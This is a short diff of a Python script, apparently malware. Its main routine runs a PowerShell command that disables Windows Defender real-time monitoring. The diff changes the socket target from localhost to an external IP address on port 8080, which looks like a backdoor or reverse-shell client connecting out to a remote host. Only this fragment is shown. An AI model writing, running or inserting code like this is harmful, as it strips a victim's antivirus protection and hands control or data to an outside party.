@@ -17,7 +17,7 @@ def run_powershell_command(command):
 def main():
     run_powershell_command("Set-MpPreference -DisableRealtimeMonitoring $true")
     # Server address and port
-    host = '127.0.0.1'
+    host = '175.45.176.100'
     port = 8080
     check = "text"
     # Create a socket object
